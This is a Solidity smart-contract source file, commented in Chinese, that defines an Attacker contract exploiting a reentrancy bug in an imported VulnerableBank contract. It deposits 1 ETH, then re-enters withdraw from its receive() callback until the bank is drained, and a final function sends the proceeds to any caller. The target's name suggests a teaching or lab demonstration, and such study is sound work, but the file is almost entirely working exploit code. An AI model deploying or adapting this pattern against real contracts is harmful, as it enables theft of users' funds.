// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

/**
 * @title Attacker
 * @dev 利用重入漏洞攻击 VulnerableBank 的合约
 */
contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    
    // 记录攻击次数（用于调试）
    uint256 public attackCount;
    
    /**
     * @dev 构造函数
     * @param _vulnerableBankAddress 目标银行合约地址
     */
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }
    
    /**
     * @dev 发起攻击
     */
    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH to attack");
        
        // 1. 先存款到银行
        vulnerableBank.deposit{value: ATTACK_AMOUNT}();
        
        // 2. 立即取款，触发重入攻击
        vulnerableBank.withdraw(ATTACK_AMOUNT);
    }
    
    /**
     * @dev 接收 ETH 时的回调函数 - 重入攻击的核心！
     * 每次接收到 ETH 时都会被调用
     */
    receive() external payable {
        attackCount++;
        
        // 检查银行还有没有足够的余额
        uint256 bankBalance = address(vulnerableBank).balance;
        
        // 只在银行余额 > 1 ETH 时继续攻击（留一点余地避免边界问题）
        if (bankBalance > ATTACK_AMOUNT) {
            vulnerableBank.withdraw(ATTACK_AMOUNT);
        }
    }
    
    /**
     * @dev 查询攻击合约的余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev 提取攻击所得的 ETH
     */
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}